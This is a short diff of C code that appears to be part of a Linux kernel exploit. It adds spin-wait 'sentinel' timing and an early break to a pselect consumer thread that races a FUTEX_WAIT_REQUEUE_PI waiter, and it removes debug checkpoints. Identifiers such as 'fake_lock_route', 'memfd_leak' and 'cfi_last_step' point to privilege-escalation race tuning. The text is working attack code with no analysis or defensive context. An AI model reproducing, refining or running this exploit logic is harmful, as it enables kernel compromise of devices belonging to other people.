@@ -14,6 +14,10 @@ atomic_int punch_consume_stop;
 atomic_int consumer_calls;
 atomic_int consumer_success;
 atomic_int main_route_delay_usec;
+atomic_uintptr_t main_result_sentinel_word;
+atomic_uint_fast64_t main_result_sentinel_mask;
+atomic_int main_result_syscall_returned;
+atomic_int main_result_seen_after_return;
 atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
@@ -54,11 +58,6 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   long wait_requeue_ret =
       futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
   (void)wait_requeue_ret;
-#if defined(APP_MAIN_ROUTE_CHECKPOINTS) && APP_MAIN_ROUTE_CHECKPOINTS
-  pr_info("main route stage=wait-requeue-return tid=%d ret=%ld errno=%d\n",
-          tid, wait_requeue_ret, errno);
-  pr_info("main route stage=pselect-enter tid=%d\n", tid);
-#endif
 
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
@@ -129,10 +128,22 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           atomic_load(&punch_consume_go) != seq) {
         continue;
       }
+#if defined(APP_MAIN_PSELECT_RESULT_ROUTE) && \
+    APP_MAIN_PSELECT_RESULT_ROUTE
+      uintptr_t sentinel_word = atomic_load(&main_result_sentinel_word);
+      uint64_t sentinel_mask = atomic_load(&main_result_sentinel_mask);
+      while (atomic_load(&punch_consume_go) == seq && sentinel_word &&
+             (*(volatile uint64_t *)sentinel_word & sentinel_mask)) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      atomic_store(&main_result_seen_after_return,
+                   atomic_load(&main_result_syscall_returned));
+#else
       int delay_usec = atomic_load(&main_route_delay_usec);
       if (delay_usec > 0) {
         usleep((useconds_t)delay_usec);
       }
+#endif
       for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) {
@@ -149,6 +160,11 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           pr_warning("pselect consumer sched_setattr ret=%ld errno=%d tid=%d nice=%d\n",
                      sched_ret, sched_errno, tid, consumer_nice);
         }
+#if defined(APP_MAIN_PSELECT_RESULT_ROUTE) && \
+    APP_MAIN_PSELECT_RESULT_ROUTE
+        atomic_store(&punch_consume_go, 0);
+        break;
+#endif
         calls_this_seq++;
         if (calls_this_seq >= CONSUMER_MAX_CALLS) {
           atomic_store(&punch_consume_go, 0);
@@ -176,6 +192,10 @@ void reset_main_route_state(void) {
   atomic_store(&consumer_calls, 0);
   atomic_store(&consumer_success, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+  atomic_store(&main_result_sentinel_word, 0);
+  atomic_store(&main_result_sentinel_mask, 0);
+  atomic_store(&main_result_syscall_returned, 0);
+  atomic_store(&main_result_seen_after_return, -1);
   atomic_store(&pipe_prepare_request, 0);
   atomic_store(&pipe_prepare_done, 0);
   cfi_last_step = 0;
